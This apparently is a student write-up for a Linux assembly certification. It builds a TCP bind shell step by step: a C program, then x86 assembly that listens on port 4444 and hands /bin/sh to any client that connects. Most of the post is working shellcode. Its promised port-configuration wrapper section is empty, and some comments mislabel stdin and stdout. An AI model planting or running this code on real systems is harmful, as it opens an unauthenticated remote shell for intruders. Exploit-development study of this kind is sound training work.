## Assignment 0x01: Create A Shell_Bind_TCP Shellcode
---
## Objectives
Create a Shell_Bind_TCP shellcode that;
1. Binds to an easily configurable port number
2. Executes a shell on an incoming connection

## Introduction
A bind shell is a type of shell in which the system on which the code is run binds a TCP socket that is designated to listen for incoming connections to a specified port and IP address. When a bind shell is used, the system on which the bind shell is executed acts as the listener. 

To more fully understand the underlying system calls required to create a TCP bind shell written in assembly, it is logical to begin by analyzing a TCP bind shell written using a higher level language such as C. For this purpose, the C program shown in the proceeding (first) section of this document will instruct a system to listen on all available network interfaces for connections on TCP port 4444. When a connection is established, `/bin/sh` will be executed on the system and input and output will be redirected to the system that established the TCP connection. 

After analysis of the C program is complete, the code can more easily be re-written in assembly. This processes is documented and explained in detail in the second section of this post. 

Finally, the third section of this paper demonstrates a program written in Python that allows a user to configure a port number to be used in the Shell_Bind_TCP shellcode.

## Analysis of Shell_Bind_TCP.c
The following code has been commented in a way that aims to break the program down into distinct sections to be referenced during analysis. A brief explanation of each commented code section will be provided in this section of the post.

```c
#include <stdio.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>

int main ()
{
    // Create a TCP Socket
    int sockfd = socket(AF_INET, SOCK_STREAM, 0);
    
    // Create an IP Socket Address Structure
    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_port = htons(4444);
    addr.sin_addr.s_addr = INADDR_ANY;

    // Bind TCP Socket to IP Socket Address Structure
    bind(sockfd, (struct sockaddr *)&addr, sizeof(addr));

    // Designate Socket to Listen for Connection Requests
    listen(sockfd, 0);

    // Accept Connection Requests on the Socket
    int connfd = accept(sockfd, NULL, NULL);

    // Direct Connection Socket Output
    for (int i = 0; i < 3; i++)
    {
        dup2(connfd, i);
    }

    // Execute Program
    execve("/bin/sh", NULL, NULL);
    return 0;
}
```

#### Create a TCP Socket
>`int socket(int domain, int type, int protocol);`

First, a TCP socket is created using the `socket` function. As described in `man 2 socket`, the function creates an endpoint for communication and returns a file descriptor that refers to that endpoint. `socket` expects a domain argument, a type argument, and a protocol argument.

In this case, the domain argument `AF_INET` specifies the IPv4 communication protocol, the type argument `SOCK_STREAM` specifies the connection-based TCP standard for data exchange, and the protocol argument `0` indicates that the system should select the default protocol number based on the previously specified domain and protocol arguments.

#### Create an IP Socket Address Structure
Next, the `addr` IP socket address structure is created which is used in the forthcoming `bind` method. As further explained in `man 7 ip`, an IP socket address is defined as a combination of an IP interface address and a 16-bit (2 byte) port number. The man page also states that `sin_family` is always set to `AF_INET`, that `sin_port` defines a port number in network byte order, and that `sin_addr.s_addr` is the host IP address and should be assigned one of the `INADDR_*` values. 

In the code above, the `htons` function converts the unsigned short integer `4444` from host byte order to network byte which is the format expected for `sin_port`. The value of `INADDR_ANY` (which correlates to `0.0.0.0`, `0` or "any") is given for `sin_addr.s_addr`.

It is also important to note that the `addr` struct will be padded to the size of `struct sockaddr` (decimal `16`) as defined in the `/usr/include/linux/in.h` file. The `struct sockaddr` definition is shown below.

```c
/* Structure describing an Internet (IP) socket address. */
#if  __UAPI_DEF_SOCKADDR_IN
#define __SOCK_SIZE__   16      /* sizeof(struct sockaddr)  */
struct sockaddr_in {
  __kernel_sa_family_t  sin_family; /* Address family       */
  __be16        sin_port;   /* Port number          */
  struct in_addr    sin_addr;   /* Internet address     */

  /* Pad to size of `struct sockaddr'. */
  unsigned char     __pad[__SOCK_SIZE__ - sizeof(short int) -
            sizeof(unsigned short int) - sizeof(struct in_addr)];
};
#define sin_zero    __pad       /* for BSD UNIX comp. -FvK  */
#endif
```

#### Bind TCP Socket to IP Socket Address Structure
>`int bind(int sockfd, const struct sockaddr *addr, socklen_t addrlen);`

The `bind` method is now used to bind the TCP socket as created by `socket` to the port and IP address initialized within the `addr` structure. From `man bind`, the `bind()` system call takes three arguments; a socket file descriptor (the previously defined `sockfd`), a pointer to a structure of the type `sockaddr_in` (the previously defined `addr`), and the size, in bytes (returned by the `sizeof` operator in this example), of the address structure pointed to by the second argument.

#### Designate Socket to Listen for Connection Requests
>`int listen(int sockfd, int backlog);`

As the socket is now bound to an IP address and a port, the `listen` function is used to designate the socket as one which will be used to accept incoming connection requests through the `accept` function. As described in, `man 2 listen` the function expects two arguments. The first argument is a socket file descriptor (once again, the socket previously defined as `sockfd`), and the second argument identifies how many pending connections should be queued.

#### Accept Connection Requests on the Socket
>`int accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen);`

The `accept` function is used to extract the first connection request in the queue of pending connections on a listening socket as defined previously using the `listen` function. Then, `accept` creates a new and distinct connected socket  and returns a new file descriptor (`connfd` in this example) that refers to this newly-created socket. The function first expects a socket file descriptor arugument, then an address argument that points to a `sockaddr` structure, and finally an address length argument. For the purpose of this program, the only necessary argument is the first argument which will be passed the socket file descriptor `sockfd` as created previously by `socket()`.

#### Direct Connection Socket Output
>`int dup2(int oldfd, int newfd);`

Next, a `for` loop is used to iterate over the `dup2` function three times, passing the values of `i = 0`, `i = 1`, and `i = 2` as the second argument expected by `dup2` during each respective iteration. The purpose of this is to direct the connected socket file descriptor `connfd` which is passed as the first argument to `dup2` for each `for` loop iteration to `STDIN` (integer file descriptor `0`), `STDOUT` (integer file descriptor `1`), and `STDERROR` (integer file descriptor `2`).

#### Execute Program
>`int execve(const char *pathname, char *const argv[], char *const envp[]);`

Finally, the `execve` function is called. The `execve` function executes the program pointed to by the first argument, `filename`. The second argument, `argv`, is a pointer to an array of argument strings that should be passed to `filename`. The final argument expected by `execve` is a pointer to an array of strings that are passed as environment to the newly-executed `filename` program. The `argv` and `envp` arguments must include a NULL pointer at the end of the array. Additionally, `argv[0]` should contain the filename assosicated with the program being executed (i.e. `filename`). In the analyzed program, the `/bin/sh` file will be executed with no additional arguments or environments being passed.

## From C to Shellcode
With the analysis of the TCP bind shell C program complete, the process for converting the code to assembly language has been simplified. From the analysis, it is clear that a system call will need to be made for the following functions in the following order:
1. `socket`
2. `bind`
3. `listen`
4. `accept`
5. `dup2`
6. `execve`

In Linux x86 assembly, system calls are made through the software interrupt `int 0x80` insruction. When the `int 0x80` interrupt occurs, a system call number that identifies the specific call to invoke is passed via the `EAX` register to the interrupt. Additional arguments to the system call specified by the value in `EAX` are most commonly passed through the `EBX`, `ECX`, and `EDX` registers. The number for each available system call can be found in the `/usr/include/x86_64-linux-gnu/asm/unistd_32.h` file on 64 bit Kali Linux. The location of this file may be different on other Linux distributions.

#### Clear Registers
```nasm
; clear registers
xor eax, eax
xor ebx, ebx
xor ecx, ecx
xor edx, edx
```

#### Socketcall Explained
Conveniently, the first four functions from the list above are all accessible via the `socketcall` system call.  As detailed in `man socketcall`, the function expects two arguments. 

```
#include <linux/net.h>
int socketcall(int call, unsigned long *args);  
```

The `call` argument determines which socket function to use, and the `args` argument is a pointer to an area of memory that contains the arguments for the socket function specified by `call`. For a list of socket functions and their respective values that are passable as the `call` argument to `socketcall`, the `/usr/include/linux/net.h` file should be referenced. The available functions for `socketcall` are shown below. 

```
root@kali:~/workspace/SLAE# grep SYS /usr/include/linux/net.h
#define SYS_SOCKET      1               /* sys_socket(2)                */
#define SYS_BIND        2               /* sys_bind(2)                  */
#define SYS_CONNECT     3               /* sys_connect(2)               */
#define SYS_LISTEN      4               /* sys_listen(2)                */
#define SYS_ACCEPT      5               /* sys_accept(2)                */
...
```

From the `unistd_32.h` file mentioned previously, the system call number for `socketcall` is decimal `102`.

```
root@kali:~/workspace/SLAE# grep socketcall /usr/include/x86_64-linux-gnu/asm/unistd_32.h
#define __NR_socketcall 102
```
#### Socket Replication using Socketcall
The first C function from the analyzed code above that will be converted to assembly is the call to `socket`. The assembly code that follows is meant to replicate the `int sockfd = socket(AF_INET, SOCK_STREAM, 0);` line of C code.

```nasm
; // Create a TCP Socket
; int socket(int domain, int type, int protocol);
; int sockfd = socket(AF_INET, SOCK_STREAM, 0);
push edx            ; 0
push 0x1            ; SOCK_STREAM = 1
push 0x2            ; AF_INET = 2
; int socketcall(int call, unsigned long *args);
mov al, 0x66        ; socketcall
inc bl              ; socketcall call sys_socket = 1
mov ecx, esp        ; socketcall *args
int 0x80            ; returns int sockfd in eax
mov esi, eax        ; store int sockfd in esi
```

#### IP Socket Address Structure

Create `struct sockaddr_in addr;`

```nasm
; // Create an IP Socket Address Structure
; struct sockaddr_in addr;
push edx            ; padding
push edx            ; addr.sin_addr.s_addr = INADDR_ANY = 0;
push word 0x5c11    ; addr.sin_port = htons(4444);
push word 0x2       ; addr.sin_family = AF_INET = 2;
mov ecx, esp        ; pointer to struct sockaddr_in addr;
```

#### Bind Replication using Socketcall
Call to `bind`

```nasm
; // Bind TCP Socket to IP Socket Address Structure
; int bind(int sockfd, const struct sockaddr *addr, socklen_t addrlen);
; bind(sockfd, (struct sockaddr *)&addr, sizeof(addr));
push 0x10           ; sizeof(addr) = 16
push ecx            ; (struct sockaddr *)&addr
push esi            ; int sockfd
; int socketcall(int call, unsigned long *args);
mov al, 0x66        ; socketcall
inc bl              ; socketcall call sys_bind = 2
mov ecx, esp        ; socketcall *args
int 0x80            ; returns 0 in eax
```

#### Listen Replication using Socketcall
Call to `listen`

```nasm
; // Designate Socket to Listen for Connection Requests
; int listen(int sockfd, int backlog);
; listen(sockfd, 0);
push edx            ; 0
push esi            ; int sockfd
; int socketcall(int call, unsigned long *args);
mov al, 0x66        ; socketcall
mov bl, 0x4         ; socketcall call sys_listen = 4
mov ecx, esp        ; socketcall *args
int 0x80            ; returns 0 in eax
```

#### Accept Replication using Socketcall
Call to `accept`

```nasm
; // Accept Connection Requests on the Socket
; int accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen);
; int connfd = accept(sockfd, NULL, NULL);
push edx            ; NULL
push edx            ; NULL
push esi            ; sockfd
; int socketcall(int call, unsigned long *args);
mov al, 0x66        ; socketcall
inc bl              ; socketcall call sys_accept = 5
mov ecx, esp        ; socketcall *args
int 0x80            ; returns int connfd in eax
```

#### Dup2 Replication
Next, a system call to to `dup2` is required which is assigned the system call number decimal `63` in the `unistd_32.h` file.

```
#define __NR_dup2 63`
```

```nasm
; // Direct Connection Socket Output
; int dup2(int oldfd, int newfd);
mov ebx, eax        ; store int connfd in ebx
; dup2(connfd, 0);
mov al, 0x3f        ; dup2
mov ecx, edx        ; 0 = STDOUT
int 0x80
; dup2(connfd, 1);
mov al, 0x3f        ; dup2
inc cl              ; 1 = STDIN
int 0x80
; dup2(connfd, 2);
mov al, 0x3f        ; dup2
inc cl              ; 2 = STDERROR
int 0x80
```

#### Execve Replication
Finally, a system call to `execve` needs to be made in order to execute `/bin/sh`. From `unistd_32.h` the system call number for `execve` is decimal `11`.

```
#define __NR_execve 11`
```

```nasm
; // Execute Program
; int execve(const char *pathname, char *const argv[], char *const envp[]);
; execve("/bin/sh", NULL, NULL);
push edx            ; delimiting NULL for pathname
push 0x68732f2f     ; //sh
push 0x6e69622f     ; /bin
mov ebx, esp        ; pointer to pathname
push edx            ; delimiting NULL for argv[] & envp[]
mov edx, esp        ; *const envp[]
push ebx            ; *pathname
mov ecx, esp        ; *const argv[]
mov al, 0xb         ; execve
int 0x80
```

## Wrapper Program for Port Configuration

_This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification:_

<http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert>

_Student ID: SLAE-1469_
---
[Home](https://norrismw.github.io/SLAE)
